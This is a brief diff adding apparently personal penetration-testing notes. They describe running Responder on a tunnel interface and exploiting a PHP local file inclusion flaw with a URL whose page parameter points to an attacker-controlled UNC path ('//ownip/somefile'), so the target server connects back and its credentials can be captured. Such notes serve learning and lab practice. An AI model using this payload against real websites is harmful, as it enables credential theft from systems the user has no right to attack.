@@ -1,0 +1,8 @@
+Responder is for get response from php websites wich got a LFI possibility
+
+starting responder
+                                                        -- sudo python3 Responder.py -I tun0
+
+going into browser to getting a response in responder
+
+http://website/?page=//ownip/somefile
